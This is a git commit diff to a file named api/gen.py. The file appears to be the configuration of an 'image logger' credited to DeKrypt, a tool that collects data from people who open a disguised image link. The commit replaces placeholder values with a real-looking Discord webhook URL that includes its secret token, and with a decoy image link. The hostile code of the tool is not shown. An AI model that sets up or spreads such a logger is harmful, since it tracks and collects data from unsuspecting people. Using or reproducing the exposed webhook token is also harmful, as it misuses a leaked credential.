604fb064cf04019e287c49ecd5713d4286f60b80
0lopz <liltay2012@yahoo.com>
2025-02-01 14:28:40 -0600

    Update gen.py

--- api/gen.py
+++ api/gen.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335345621409988679/ItAA0Aa3xjkP3p5gLeQqnCnF3a4zlj6TzMKoFEHr4KfEDlXEN9JrqwZPnx-gIF5kjo8O",
+    "image": "https://miro.medium.com/v2/resize:fit:1400/0*y2OAF_DSarBAjihO.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
